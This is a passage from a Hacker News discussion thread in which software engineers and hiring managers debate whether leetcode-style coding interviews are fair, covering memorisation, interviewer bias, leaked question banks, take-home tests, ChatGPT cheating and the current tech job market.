entire interview. To the company this is acceptable noise, but to the individual, this is costing us 100s of thousands of dollars, because there’s only a handful of companies that pay well and they all have the same interview process. Failing 3 interviews probably means you’re now out $200-300k of additional compensation from the top paying companies. I’ve interviewed for and at FAANGs. I can’t believe the low bar of people that we’ve hired, while simultaneously seeing insane ridiculous quad tree/number theory type questions that have caused other great engineers to miss out on good opportunities. Someone will reply to me “if you know how to problem solve you will always pass.” Ok, come interview with me and I will ask you verbatim one of those quad tree/number theory/inclusion exclusion principle questions and I’d love to see you squirm, meanwhile another candidate is asked a basic hash map question. reply emodendroket 11 hours agoparentI'm sure anyone determined to do so can act unfairly regardless of what process is in place, but the fact that there is a standardized test in my mind does the opposite and makes the process much fairer. Assuming a fair-minded interviewer, the process gives a chance to a candidate whose resume may have less vaunted names on it to demonstrate their skill. I'm quite sure that I'd never have had some of the opportunities I have, not having a CS degree, if it weren't for whiteboarding interviews. I can't imagine any possible process that would thwart interviewers intentionally subverting it to hire their friends. reply 369548684892826 11 hours agorootparent> the fact that there is a standardized test in my mind does the opposite and makes the process much fairer The problem isn't standardized tests, it's that leetcode questions are about having the time to have learnt the answer beforehand, rather than raw ability for problem solving. reply jonkho 10 hours agorootparentThat’s not true. In any discipline when confronted with a test there are two strategies: brute memorization of the question/answers, or developing the skills to tackle the problem dynamically. You cannot categorically claim that LC tests are largely memorization tests rather than raw problem-solving skills. That is just the approach you are capable of taking. Not being able to see up the mountain doesn’t imply there are no climbers above you. reply KaiserPro 8 hours agorootparent> You cannot categorically claim that LC tests are largely memorization tests rather than raw problem-solving skills If that were the case then a normal, well accomplished software engineer shouldn't need to \"grind\" leetcode to pass an interview. its just a cargo cult. Getting someone to do a code review is a much much better test of skill: Do they ask questions? are they kind in their assertions? At what point do they go \"I don't know\"? Do they concentrate on style or substance? do they raise an issue with a lack of comments? do they ask why the description of the PR is so vague? When they get a push back, are they aggressive? All of those are much better tests than \"rewrite a thing that a library would do for you already\" reply hackinthebochs 7 hours agorootparent>If that were the case then a normal, well accomplished software engineer shouldn't need to \"grind\" leetcode to pass an interview. No, what this shows is that the skill range for accomplished professional software devs is absolutely massive. What these companies want is to find the tail end of this very wide distribution. Leetcode interviews do a decent job at this. If you have been coding for a decade and can't do leetcode mediums with almost no prep, and hards with a moderate refresher on data structures, then you're simply not the in the right tail of the skill distribution and they don't want you. This is what so many in our industry can't accept: you're just not talented enough to earn a FAANG job. reply DragonStrength 6 hours agorootparentNo, these engineers at FAANG companies could not solve those problems cold without having been taught how. I have worked at two, which is how I know. I have never seen a question in an interview I haven’t seen before. Many of these questions went unsolved for decades in the industry, so no, these engineers, who mostly aren’t DSA experts but distributed computing experts, could not solve them cold. I also saw how interviewers used questions to re-enforce their own biases on university, gender, or home country in these interviews. reply KaiserPro 6 hours agorootparentprev> Leetcode interviews do a decent job at this. I mean it doesn't, because I'm at a FAANG, At a FAANG you are infantalised from the very start, sure you passed a very difficult interview where you have to balance a binary tree efficiently as possible. But you're going to use none of those skills here. what you actually end up doing is copy/pasting some random code you found using internal code search, because the sensible way of doing it can't happen as that would involve porting a thirdparty library, and doing all the procedural work that follows. so you hack some shit together, ship out out and hope that it doesn't break. You then decommission the nasty hack you shipped last year and claim credit for innovating. Is your product not hitting the right metrics? loosing users? doesn't matter, so long as the super boss is happy that you've hammered in the REST API for the stupid AI interface, you're not going to get fired. In a startup/small company, if you fuck up, the whole place is going under. Need metrics? you'll need to find a small, cheap and effective system. Here, we just record then entire world and then throw hundreds of thousands of machines at it to make a vaguly SQL interface. Don't worry about normalising your data, or packing it efficiently just make a 72 column table, and fill it full of random JSON shit. Need to alter a metrics? just add a new column. In short, don't praise or assume that FAANGs are any good at anything other than making money. They are effectively a high budget marvel movie, Sure they have a big set, but most of it is held together with tape and labour. Look round the side and you'll see its all wood, glue and gaffer tape. reply hackinthebochs 5 hours agorootparent>But you're going to use none of those skills here. FAANGs want the top .1% of developers, they don't necessarily need them for most roles. But the point is to hire developers that you could put into any role in the company within reason and have them be successful. 99% of development work at a FAANG is pretty unexceptional and doesn't require exceptional developers. They hire for that exceptional 1%. reply KaiserPro 5 hours agorootparent> FAANGs want the top .1% of developers, FAANGS want a load of loyal, naive people who are willing to work loads of overtime and not ask too many questions. Who better than posh kids from great universities who haven't quite figured out that life isn't a meritocracy yet!? Sure they also want the top 0.1%, but they have a different interview track. Do you think all those OpenAI engineers that were going to follow Altman were asked to do leetcode? reply hackinthebochs 4 hours agorootparent> Do you think all those OpenAI engineers that were going to follow Altman were asked to do leetcode? I don't know about OpenAI specifically, but I have heard of interviews at other top ML research positions were partly based on leetcode problems. reply throwaway7ahgb 6 hours agorootparentprevFWIW I sort of agree with you. Background: I'm in a FAANG type company now, a YC company, 3000+ engineers. I'm a Staff SWE with 20+ years of experience (ECE degree) and make $600k+ per year. I've went through the promo cycle here (it sucks). I can't do any leet hards and can do leet mediums after studying. Some easy's take me a couple of tries. I usually do very poorly in interview coding exercises. ** throwaway , main account is 10+ years old. reply 6510 3 hours agorootparentCurious, would you say FAANG offers the right challenges to stay in the 0.1% or 1% if one started out there? Are they actually in the right place to grow? reply Tade0 10 hours agorootparentprevThat's exactly true. LC tests typically copy problems from the university the interviewer graduated from. College programs differ, so this is really a case of what you were introduced to. There's a fairly popular online LC test company in my corner of the world which was formed by graduates and lecturers from a certain university and they started out by just giving the problems from the curriculum. Result was heavy bias in favour of students and alumni of that university. reply johnnyanmac 8 hours agorootparentprev> You cannot categorically claim that LC tests are largely memorization tests rather than raw problem-solving skills. Sure I can. By the time you get to Leetcode hard, these aren't just \"can you derive the answer\". The questions by design take 45+ minutes and have some weird quirk in it that is nominally related to the core concept being tested. These aren't necessarily meant to be done on the fly during an interview period. >Not being able to see up the mountain doesn’t imply there are no climbers above you. a better analogy is that youre on a road and you see a freeway above you. The people above you aren't \"better\", they are simply on another road, to another destination. But they aren't necessarily worse either. They could be on their way to a dead end job or could be a billionaire CEO. That is to say, it's useless comparing yourself to other people you don't know. Everyone has their story. reply jonkho 3 hours agorootparentThank you. You just proved my point that “categorically LC is not largely memorization” by reinforcing that only in specific cases in some specific levels that you do need some specific domain knowledge. reply fifilura 9 hours agorootparentprevAny advanced topic requires struggling through a big set of \"special cases\" to master. This is how I learned mathematics for example. After you have learnt enough of the special cases (trees) you start to be able to connect them and see their relation (the forest). reply johnthewise 10 hours agorootparentprevSome people can't do it whether they had the time to study, which the point of the test. reply mathgladiator 7 hours agorootparentprevSome of us derive the answer on the spot... reply John23832 7 hours agorootparentFor the hashmap problem, sure. Any SWE worth their salt should be able to figure those out. I highly doubt you are sight-reading atomic bomb LC hards. reply koolba 10 hours agorootparentprev> The problem isn't standardized tests, it's that leetcode questions are about having the time to have learnt the answer beforehand, rather than raw ability for problem solving. This sounds like you want to penalize students who studied for the exams. Or at least not reward them. Like all interview formats, it’s a proxy for understanding if the prospect would be able to get the work done and be a good fit with the rest of the team. I’d say it’s a pretty good proxy for work ethic at crunch time as well. If your complaint is that a normal person wouldn’t have the time to study these things in detail, why would a company want to hire someone who has external obligations? reply johnnyanmac 7 hours agorootparent>This sounds like you want to penalize students who studied for the exams. Or at least not reward them. Interviews are like exams but you don't have any clue what topics are on the test. If Leetcode was some licensed, standardized approach to getting some license to verify my ability to code myself out of a paper bag: I'd hate it, but I'd grit my teeth and study it. exams can be studied for. But it isn't, so I can be studying leetcode questions and be hit by a dozen other topics. I don't have time to study everything, and the market right now isn't worth pinpointing specific companies unless you have a stellar reference. >I’d say it’s a pretty good proxy for work ethic at crunch time as well. I couldn't disagree more. Someone so prepared for interviews have the least skin in the game. Layoffs come and they didn't work > 40 hours but were otherwise excellent? oh well, get another job in a month because interviews are a breeze for them because they breathe DS&A. >why would a company want to hire someone who has external obligations? I'd love to know the answer here as well. Why do companies internally penalize workers who were laid off, but then try to \"steal\" currently happy employees but make them jump through these hoops? The logic seems backwards; interviews should be hard and depress wages for the laid off, desperate workers so you can get a desperate unicorn. But you want someone who lacks the time to study because of current job obligations to get to an offer faster. Their proof of work ethic is being employed to begin with. reply John23832 7 hours agorootparentprevWhy should a job be an exam? For someone who has worked at both FAANGS and startup, I've never found a job that remotely matches a leetcode problem. Most companies are building products anyway. reply bluGill 5 hours agorootparentThe only value in leetcode is you should be able to solve a couple in a short time and thus prove you are least know something about writing code. We use them as an interview prescreen because once in a while someone seems like a good person we would like to work with, but we have no clue after the interview if they can really code. We had one person who worked on [censored] 20 years ago, then was manager of [non-programmers, rest censored] - now wants to get back into coding - can this person still code? If so I want them, but if they have forgotten everything... I of course censored details for privacy reasons. reply worthless-trash 10 hours agorootparentprev> This sounds like you want to penalize students who studied for the exams. Or at least not reward them. s/exams/interview/g reply exe34 10 hours agorootparentprevit's a good measure of whether they will sacrifice their home life and spend unpaid time doing extra work for you. reply mvdtnz 10 hours agorootparentprev> If your complaint is that a normal person wouldn’t have the time to study these things in detail, why would a company want to hire someone who has external obligations? External obligations like full time employment and a family? reply koolba 10 hours agorootparentYes exactly. All things being equal, I’d rather higher someone who’s going to dedicate his entire life to the soul crushing work he will be assigned. reply azangru 6 hours agorootparentI don't disagree; but why does the work need to be soul-crushing? reply myspy 8 hours agorootparentprevWow, look guys I've found the fool. reply jkukul 9 hours agorootparentprevA leet-code test would be much more standardized if candidates could solve it at home. Just send me a link to the quiz and let me solve it within a specified time frame. I've done tests like this for some companies. It felt a lot fairer and more closely resembling the actual work environment than live leet-code interviews, with biased interviewer(s) and a stress factor that's not a part of the actual job. reply skeeter2020 7 hours agorootparentAs a hiring manager I HATE leet-code tests, and they do nothing to differentiate candidates, but a take home in the era where people run chatGPT beside the interview window, or have someone else do the interview for them? Not a chance. You are 100% correct that it is way more representative, but the prevalence of cheating is ridiculous. reply jkukul 6 hours agorootparentI totally understand you, but want to offer a different perspective. They will also be able to use ChatGPT on the job. And StackOverflow. And Google. If they know how to use tools available to solve a problem, that will benefit them on the job. If you're testing them for what ChatGPT can already solve, then are the skills being tested worth anything, in this day and age? Take-home LeetCode, even with cheating will still filter out a good chunk of candidates. Those who are not motivated enough or those who don't even know how to use the available help. You'll still be able to rank those who solved the task. You'll still see the produced code and be able to judge it. Like other commenter points out, you can always follow up the take-home LeetCode. Usually, it becomes apparent really quickly if a candidate solved it on their own. reply CoastalCoder 5 hours agorootparentprevThis does seem like a vexing problem, especially when interviews are conducted remotely. I wonder if either of the following could be cost-effective: (a) Fly the candidate to a company office, where their compute usage could be casually monitored by an employee. (b) Use high-quality proctoring services that are nearby to the candidate. E.g., give them 1-2 days in a coworking space, and hire a proctor to verify that thy're not egregiously using tools like ChatGPT. Or alternatively, would it suffice to just have a long conversation with the candidate about their solution? E.g. what design trade-offs they considered, or how might they adapt their solution to certain changes in the requirements. reply oytis 6 hours agorootparentprevTake home is fine if you discuss it later in the interview. But also there should be some pre-screening to keep the number of interviewees reasonable. reply Benjammer 11 hours agorootparentprevSo are we just going with a base assumption that interviewers can NEVER be trusted with anti-bias training and learning how evaluate people fairly? The examples mentioned in this comment section are all blatantly intentional biases that people are choosing to use. The amazing part is that all the “standard test eliminates bias” people seem to the most ignorant to where bias helps THEM. Forcing people to study for two months is blatantly discriminatory to age and family status, at a systemic level. While “this white straight guy might explicitly choose to give the other white straight guy an easy question,” is very subjective and intentional on the individual level. Like, employees can always choose to do bad things, in any situation. That’s why we have at-will employment… Is the culture just so broken at these companies that it’s hopeless to expect people NOT to blatantly exploit the system for their friends? Why don’t people get fired for doing that? reply johnnyanmac 7 hours agorootparent>are we just going with a base assumption that interviewers can NEVER be trusted with anti-bias training and learning how evaluate people fairly? Yes. Because interviewing is 1. hard, but no company has proper full time proctors. So \"expert interviewers\" are a rarity 2. not standardized in the slightest. So your performance varies entirely by the interviewer, their style, and their mood that day. 3. some weird blind test where you hope you studied the right topics. You're not getting the best out of a candidate, you're basically hoping they read your mind and know exactly what you want them to say. >Is the culture just so broken at these companies that it’s hopeless to expect people NOT to blatantly exploit the system for their friends? Why don’t people get fired for doing that? Sure. but that's a universal problem. \"It's who you know, not what you know\" is advice that has spanned centuries. I can't even blame the modern tech industry for that one. That + the above issues with interviewing mean you're always going to go with a referral over a random applicant. reply Benjammer 2 hours agorootparent1. I’ve worked at multiple companies that absolutely have expert interviewers who design the interview questions and then teach mid-level engineers how to proctor them correctly. It’s like one 30 minute meeting, it’s not that big a deal. 2. All tech companies I’ve worked at since around 2015 have completely standardized interview questions, sometimes also hosted in a GitHub repo where any employee is free to comment or even open a PR to request a change. Every candidate gets the same questions. This thing where “faang” interviewers just pull a random LC question out of their ass is complete insanity to me. An organized set of questions takes a senior engineer like a week to organize and commit to… And if your questions can be memorized and recited by rote memory and the candidate can do well on it without the proctor knowing, then your questions are BAD or your proctor is a moron. 3. I’ve never worked anywhere where I would describe the interview like this. Even the startup where I was the first engineer and there was no formal “test”, it was an hour long chat with the technical cofounder where he grilled me about coding skills and past experience/accomplishments. I won’t take a job if the interview isn’t asking me things that focus on my existing experience and skills, it’s a red flag about the company culture in general. As for your “universal problem,” I disagree with fatalistic takes where you just throw your hands up and say “whatever shall we do” all the while YOU are the one benefitting from the system that cannot be changed. This is how simple-minded people think about the world. reply bluGill 5 hours agorootparentprev> 2. not standardized in the slightest. So your performance varies entirely by the interviewer, their style, and their mood that day. That isn't always true. When I interview HR gives me the exact questions I'm allowed to ask. These are vetted both to prevent me from asking something illegal, and also by research to get the type of things useful for interviews. Sometimes it is annoying - you can easially finish the interview with a great score but I have no clue if you can write code or not. However we are carefully trained on how to ask the questions and how to grade them. reply johnnyanmac 5 hours agorootparentThat makes sense for soft questions. But I doubt it's HR devevloping a dynamic programming problem and writing a rubric for how good a score you can give based on a response. I was mostly referring to technical tests, but I understand there are definitely some set of questions you need to ask no matter what. I don't really knock recruiters too much for repeating the usual \"are you authorized to work in the US\" kinda stuff even though it is the first question on their job application. reply Aunche 10 hours agorootparentprev> Forcing people to study for two months is blatantly discriminatory to age and family status, at a systemic level. How is this any less discriminatory than any other assessment based interview where you need to prepare? Non-assessment based interviews end up being vibes based which is much more discriminatory. reply johnnyanmac 7 hours agorootparent>any other assessment based interview where you need to prepare? because most other assessment based interviews are based on what you do on the job, likely stuff you've done at previous jobs as well. Less prep time when you spent thousands of hours already as a career. reply angoragoats 8 hours agorootparentprevYou’ve set up a false dichotomy here; for any given position, there is typically a way to conduct an assessment-based interview that doesn’t require too much preparation for qualified candidates. For example, at my current job, we hire web developers with Rails experience. Our technical interview process consists of either a pair programming session or an async/take-home task (candidate’s choice) which requires the candidate to implement a small feature in a Rails codebase. We do have some room to improve on objective evaluation of the candidate’s performance, but there is a test suite and a rubric which we use to evaluate their work. None of this should require that the candidate study, unless they’re coming in to the interview without Rails experience. reply Aunche 4 hours agorootparentThis may work out great if you happen to have worked on Rails for your last job. However, I doubt that everyone you interview is actually that familiar with Rails but rather is pursuing any sort of opportunity that they can get. In that case, they would actually more time to brush up multiple different tech stacks than simply on algorithms. reply angoragoats 3 hours agorootparentIn that case, the interview question is working as intended. For most of our roles, we want several years of Rails experience, and we are clear about that fact in the job listing. If someone applies without Rails experience, they either didn't read the job listing, or are desperate to find any job. While I empathize with folks in the latter situation, our positions really do require the experience, and the job market isn't so bad right now that a smart candidate should be going a long time without finding something. If you happen to have Rails experience but it was several jobs ago, the task we give you is basic enough that you should be able to Google what you need during the task to refresh your memory fairly quickly. In fact, I did this when I applied, having not worked with Rails in a number of years. Edit: My main point is, even if you technically do have to \"study\" (really, just Google a few basic Rails concepts) if you're rusty, everything you do is preparing you for the actual job. Studying how to implement a hashmap, or computing the longest palindrome from a string of characters, or whatever other harebrained problem FAANG etc want to ask, is 99% of the time not really helping you prepare for those jobs. reply scott_w 10 hours agorootparentprev> the fact that there is a standardized test in my mind does the opposite and makes the process much fairer. It can make the process fairer but it's not a given. You can do the classic \"no dogs, no blacks no Irish,\" and that was a standard across pubs in England. It certainly wasn't fair, unless you were racist. If you're committed to fairness, then a standard will help. It gives you a clear point to fix and improve things and something you can use to measure if you're achieving your stated goals. That's definitely something you can't do if you're just making things up as you go along. And yes, I made a deliberately provocative statement. I'm obviously not saying whiteboard tests are the equivalent of segregation. reply civilized 8 hours agorootparentprev> the fact that there is a standardized test ...a standardized test? No. There are tests. They sure as heck aren't standardized. Maybe they should be, since everyone seems to be doing the same thing. reply bossyTeacher 8 hours agorootparentprev> I'm sure anyone determined to do so can act unfairly regardless of what process is in place, but the fact that there is a standardized test in my mind does the opposite and makes the process much fairer. This is what privilege looks like. The inability to see barriers that affect others in a worse position. Standards do not imply fairness only consistency. You got a test that filters out people who lack the time to train for these tests. Basically, devs with a life (see family) reply CoastalCoder 5 hours agorootparentIIUC, in your view using standard tests is a damned if you do, damn't if you don't scenario. Is there a solution that you'd recommend? reply boshalfoshal 11 hours agoparentprevThe problem you are describing is interview variance and hiring bias, not leetcode. This happens irrespective of interview style. Many companies have question banks that are specially designed to be fair/have some contextual relevance (ideally) to some \"realistic\" problem. Or at least, many of the companies I've interviewed at follow this model. I consider these coding questions to be \"leetcode\" style because at the end of the day they are an isolated coding problem, even though they may not be a problem from leetcode verbatim. Companies that execute on that style of interview well are generally fairly pleasant interviews, at least in my experience. Good companies/interviewers will gauge more than just the final code to determine a hire or no hire. And a large portion of companies also have hiring ratings on a scale to make it less binary. reply dinobones 11 hours agorootparentI take issue with it because Leetcode gives tech people a fake feel good, “yeah but at least it’s fair” illusion, when really it’s probably just as biased as any other hiring method. This is ironic considering these companies have forced mandatory DEI seminars (which I have no problem with btw), inclusive language, #EveryoneCanCode, and so on. But despite all this, you end up with teams and organizations that are 99% of the same X somehow. Replace X with race, school, even state from home country sometimes. You know there are websites where people share all the interview questions to these hard interviews / referrals exclusively in their language and behind a pay or rep wall? And there are Telegram groups where international students leaks the questions or do interviews in place for one another. It’s inevitable these types of issues arise when there’s so much at stake, ex: in just 5 years, a $200k TC advantage at a top company, becomes $1m or more with appreciation. I just really dislike the veneer of “fairness” when there are so many problems with the process, even beyond the questions that have nothing to do with the job. reply lupusreal 10 hours agorootparent> This is ironic considering these companies have forced mandatory DEI seminars (which I have no problem with btw), inclusive language, #EveryoneCanCode, and so on. I really do wonder what those sanctimonious sermons are meant to accomplish. People who are already ideologically aligned with them won't learn anything new and may just resent it, while people who aren't aligned won't become aligned as a result of that \"training\". But you're talking about it as though you expect it to have a constructive impact, resulting in irony when it doesn't. I don't see the irony because I don't expect any benefit from those struggle sessions in the first place. reply matheusmoreira 9 hours agorootparentThey're supposed to absolve the corporation and its leadership of responsibility and liability. By giving that training they get to claim they did all they could. reply lupusreal 5 hours agorootparentI think that's precisely right. reply asmor 7 hours agorootparentprevYou'd be surprised how much self-perception and reality can differ. Lots of types that think they're the best allies ever and then show a total lack of empathy (especially if someone's different in their immediate family) that'd need a reality check. Though usually the intersection of people running DEI initiatives and those people make a large set. Assimilated gay people love talking shit about how trans people make \"us\" look bad. reply workingjubilee 8 hours agorootparentprevstruggle sessions usually involve public torture or executions. it's laughable to compare \"being mildly inconvenienced\" with that. reply lupusreal 5 hours agorootparentStruggle sessions in their basic form used social coercement to extract confessions of guilt against some collective cause. This describes the DEI training sessions I've been in well. Admit that you have bias (effectively confessing guilt to a \"crime\" that gives your employer leverage over you) or get dogpiled and have your refusal to admit guilt cast as evidence of your guilt anyway. reply kidintech 11 hours agorootparentprevQuestion banks that are too big: huge variance, and OP's point stands. Question banks that are too small: leaked on eastern forums immediately, candidates show up reading answers out to you (some of the guides include guidance on when to pretend to think, I am not kidding). The idealized version of \"question banks\" might work. The real one does not; you'd require employees constantly scouring forums in every language known to mankind, immediately removing anything that gets leaked. On top of that you'd probably require a competent committee overseeing all questions in the bank constantly and ensuring the lack of variance in difficulty. Source: I interviewed at and for Goog and Pltr. reply boshalfoshal 11 hours agorootparentI agree with you, but I don't really see how this invalidates the style of interviews where you're presented with some timeboxed coding problem (of reasonably scaled difficulty) and are asked to solve it. There will be bad actors regardless of the interview style, thats why companies have multiple interview types/styles/rounds to sus out a candidate, as you probably know. If they BSed their way through a leetcode interview, then they probably won't make it past a behavioral interview where they have to go in depth on some past project. And if they BSed that as well as every other round, then hey maybe they are crafty enough to succeed at the actual job. reply kidintech 10 hours agorootparent> and are asked to solve it. I think this is where our different opinions come from, while we agree on the other aspects. In my personal experience, I have never felt that the hire/no-hire decision relied exclusively on my ability of solving the presented problem; I have passed interviews where I did not solve the LC-style problem optimally but I communicated clearly, picked up on hints, was aware of when I hit \"walls\" and provided working but less than ideal alternatives when I could not figure out the neat tricks. Reading through the thread it seems that my experience is not universal, and the majority here have had less pleasant interviews, so I understand where you are coming from. reply bombela 9 hours agorootparentI have had all possible experiences. Sometimes I feel like genius and ace some leetcode with an almost novel solution. Sometimes I missunderstand the question/scope and mud myself into the hole of despair. I have been rejected for one mediocre interview among many good ones. Or the other way around accepted even though I didn't perform well. Sometimes the interviewer works with me. Sometimes against me. Sometimes a war story impresseses positively, sometimes raises suspicions. At this point it feels like gambling. I have also ran almost 400 interviews on the other side over the years, and to me it seems quite clear when somebody cannot write code at all. I like to think I am not biased. But who knows. reply johnnyanmac 7 hours agorootparentprev>Reading through the thread it seems that my experience is not universal, and the majority here have had less pleasant interviews, so I understand where you are coming from. it changes immensely based on the job market. I've defintiely tanked some inerviews hard, stumbling on softball questions that shoulda been a bullet point. But I get pretty far or even gotten offers. The last 12-18 months though? I've had interviews that felt like a dream but got zero follow up to. Been ghosted after seemingly final rounds where I spent 5+ hours on technical tests. It's not even enough to \"understand the problem and communicate steps\". You gotta be flawless, and you still might be cut compared to 3 years ago where a \"C\" performance could still land multiple offers as long as your experience made up for the quiz questions. reply CoastalCoder 5 hours agorootparent> it changes immensely based on the job market. I dodged the .com bust because I worked for the U.S. DoD at the time. But I got laid off for the first time during last year's \"15% bloodbath\". If I compare my current job search vs. all of my job searches in the past: (1) As parent comment said, the bar seems to be much higher. I've thought that I did really well on some interviews, only to not get an offer. (2) Some interview processes are way more rigorous. For a DevTech role within nVidia, I had 12 interviews + 2 take-home problems. (BTW, the take home problems were incredibly fun. Well done nVidia!) (3) I've finally accepted a job offer from a large, established tech company, and the pre-onboarding process is amazingly slow. I accepted the offer a month ago and still don't have a start date. In a better job market either (a) they'd probably work harder to be good about this stuff, or (b) I'd just take a different job because of the delay. reply CoastalCoder 2 hours agorootparentI forgot to mention another: (4) Ghosting candidates seems common now. I'd never experienced it before now. reply ryandrake 1 hour agorootparentprev> (2) Some interview processes are way more rigorous. For a DevTech role within nVidia, I had 12 interviews + 2 take-home problems. (BTW, the take home problems were incredibly fun. Well done nVidia!) That's ridiculous, tho. Did they really not have enough information on the 11th interview to know whether or not they wanted to hire you? reply Rinzler89 9 hours agorootparentprev> leaked on eastern forums immediately What exactly are \"Eastern forums\"? \"Eastern\" what? Europe? Asia? The world? reply kidintech 9 hours agorootparentThe most common example would be 1point3acres. I'd prefer to not be more specific; I chose the word Eastern on purpose. For DEI committees reading this: I am both eastern european and asian, so I hope to be exempt from any scrutiny. reply Rinzler89 9 hours agorootparentSo you wanted to say \"Chinese forums\" but couldn't say it out of fear? reply kidintech 8 hours agorootparentno. I wanted to say Eastern, as I have examples from both Asia and East Europe. I wished to not be more specific so as to not derail the discussion into \"user kidintech implied that nation X has a tendency to cheat\". reply Rinzler89 8 hours agorootparentOut of curiosity, can you share some examples from eastern Europe? Where does one find such websites? Also, IMHO, blanket generalizations like \"Asia\" and \"Eastern Europe\" in such contexts can actually be more offensive than just mentioning the one country where the thing happens since you're basically painting with tar a whole sub-continent with dozens of different countries, just for the things happening in one country. What I mean is, if by Eastern Europe, you actually mean some dodgy Russian forums, I think a lot of Eastern Europeans from Bulgaria all the way to Poland and the Baltics might feel offended of being included since we are not the same. reply kidintech 7 hours agorootparentNo, because I feel like mentioning previous employers AND mentioning the languages I speak would get quite specific. You are interested in Eastern Europe, so you should be familiar with olympiads; ask around any circle of ex-olympiad participants and you are bound to find something. I am not sorry if you took offense; you're either from one of these countries and are clueless to the circles that exist next to you, or you are not from one of these countries and are trying to be offended on behalf of others. reply Rinzler89 7 hours agorootparent>ask around any circle of ex-olympiad participants and you are bound to find something. Obviously I'm not a golfer. reply johnnyanmac 7 hours agorootparentprevYeah, there's also the implication here that Americans rarely cheat. They aren't as public because English is under a microscope, but there are definitely answer banks if you know the right person and can fork over the cash. If it's anything like High School/College, the sad part is these kinds of people could probably do well in interviews regardless. These answer banks are simply the difference between an A and an A+. And sadly the current market seems to only want A+ candidates. Who's fault is it really? reply Rinzler89 7 hours agorootparent> And sadly the current market seems to only want A+ candidates. You mean the current FAANG market paying top dollar. I know plenty of unknown companies taking B candidates because they aren't paying top dollar (in Europe at least) >Who's fault is it really? The governments and central banks for devaluing the currency post-2008 with their zero interest rates, causing the value of savings and wages to plummet and the value of assets, housing and stonks to skyrocket, causing people to chase get rich quick schemes on the stock market and on the jobs market. Coupled with the VC promoting for an unsustainable growth (more like pump and dump) of so called \"tech companies\" who's products were not economically viable from the get go, they just survived on zero-interest money and fake promises, artificially boosting the demand for SW workers casing many young people to go into tech just to chase money, money that's now gone and so is the demand for coders. Without this artificial demand for devs caused by zero rates and overhype in the tech industry of financially unsustainable products that were banking on skirting the local laws (AirBnB, Uber, etc), then those people chasing money would have went into finance or investment banking to chase money there instead of causing a huge backlog of candidates in tech. Just my 0.02$ reply johnnyanmac 6 hours agorootparent> I know plenty of unknown companies taking C-/B+ candidates because they aren't paying top dollar. in my experience: not these days. And I work in games, so \"top dollar\" was never in question. >My 0.02$ That's a fair take. Tech in some ways was indeed a necessity with a huge reach, so I don't think the overhype was the difference between being a trillion dollar industry and a million dollar one. But tech would probably still be a billion dollar industry without all the factors you mentioned. Games... well, stability was never a factor, and I knew that going in. It's a shame they are doing the exact same pump and dump schemes tech has fallen into. And it's not like layoffs were uncommon after a project finished; it's just that they are doing it purely for better looking earnings call instead of \"we cannot keep funding studios anymore\". reply DonHopkins 6 hours agorootparentprevSo New York, Boston, Washington, Baltimore, Philadelphia, Washington DC, Maryland, Virginia, Delaware, New Jersey, Main, Connecticut, Rhode Island, etc? Or by \"cheating\" are you specifically referring to the lying cheating treasonous fraud from New York who was just found guilty of 34 felonies to cover up cheating on his wife with a porn star to inflence the election? reply skeeter2020 7 hours agorootparentprev>> I am both eastern european and asian, so I hope to be exempt from any scrutiny. This only works if because I'm western and white I must ALWAYS be scrutinized. reply martindbp 7 hours agoparentprevIt's also a great way to filter out anyone who has any kind of commitment like kids, aging parents to take care of, or have health issues themselves that makes it hard to cram leet code non stop on top of a busy career. For companies this is very rational, you want non-distracted employees who can work over time. reply hobs 6 hours agorootparentIt's really not that rational unless you want someone only familiar with being the top code monkey. In all my years of sw dev the number of times that would have helped vs being able to communicate and manage expectations across a swath of people is like 1:1000. reply slavapestov 6 hours agorootparentTo be fair, you need at least one person on the team to do the actual work, while everyone else is “communicating and managing expectations”. reply pavel_lishin 5 hours agorootparentThat statement is not untrue, but I think it over-estimates how much of the \"actual work\" is banging out code, vs. making sure the correct code is being written. reply ryandrake 1 hour agorootparentYea, I've worked in a place where it was just \"coders coding\" and nobody was communicating and managing expectations, and that was its own unique form of awful. You need both. reply bandyaboot 5 hours agorootparentprevIt’s actually possible for members of the team to be capable of doing “actual work” in addition to being good communicators. reply ownagefool 11 hours agoparentprevI don't think the problem is the format, i.e. a 30-50 minute interview on simple coding with DS&A problems, but the escalation. The reality is, fizz buzz got us 75% of the way there. It turns out when pressed, a lot of people can't write code. Yes, there's false positives, but there's also people brute focing their way through via copy & paste. This doesn't manifest as a person who can't do any task, just as a person that's slow, delivers weird abstractions, and would take a lot of your time to get anything useful from. But those people are also making those arguments, because, as you said, there's hundreds of thousands of dollars in it. reply wruza 10 hours agorootparentA lot of people couldn’t even read this thread if someone was watching closely. They’d recognize words and idioms, but couldn’t make sense of these or think. It’s called anxiety and rarely has anything to do with actual performance. Anxiety is a frequent guest in a smart guy’s home. As an early 2000s integrator/analytics I learned to write code when someone watches out of interest or straight time pressure (still taxing sometimes). But most developers that I know intellectually curl up in such situation, regardless of their skill or performance levels. We worked with one very math-y low-level-skilled guy whom our clients described as “literally freezes for an hour without moving, should we pay for it?” when he did field work. He was a very strong developer otherwise. Not that a company must hire or want these people, but the idea of writing code under uncanny pressure all day makes as much sense as that swordfish scene. reply ownagefool 8 hours agorootparentI have empathy for the false negatives. I have been them, or maybe at times I'm simply a false positive, the problem is those people are likely to freeze no matter the interview. Further still, I get push back with folks citing self-prescribed medical conditions, but the same people generally display the same behaviours during the working day. So other than contract to hire, which typically limits you to people with a job, I don't personally have a better way. reply CoastalCoder 5 hours agorootparent> I have empathy for the false negatives. I have been them, or maybe at times I'm simply a false positive, the problem is those people are likely to freeze no matter the interview. I can't speak to the statistical claim that \"those people are more likely to freeze no matter the interview.\" But just my personal anecdote: I do fine on take-home coding tests, but I freeze up on live-coding tests. This is one reason I'm vexed by the allegedly common cheating in take-home coding tests. It makes employers suspicious of the testing style that I'm best at. reply ownagefool 5 hours agorootparentI've actually had people cheat on live coding sessions. For north of $2m over your career, cheating probably is the smart thing to do, especially for a borderline candidate, as there's a fair amount of evidence that the prestige on your CV will make things easier going forward. However, my problem with take homes was never that the candidate would cheat, but rather they'll probably spend way more time than the 2 hours allocated. I'm actually less worried about the candidate doing that, than I'm worried that the interviewer bakes in a bunch of assumptions like having a machine setup to do the task, having the specific domain knowledge and experience, and then accidentally trolls the candidate with little to no avenue for feedback. reply CoastalCoder 5 hours agorootparent> I've actually had people cheat on live coding sessions. What tipped you off? Also, I'm curious: do you think having them discuss their solution in depth would have been a good countermeasure? reply ownagefool 4 hours agorootparentI mean it was pretty obvious with their eyes darting then several lines of code appearing in the code editor. Of course, this doesn't mean I've discovered 100% of the cheaters, just the obvious ones. > Also, I'm curious: do you think having them 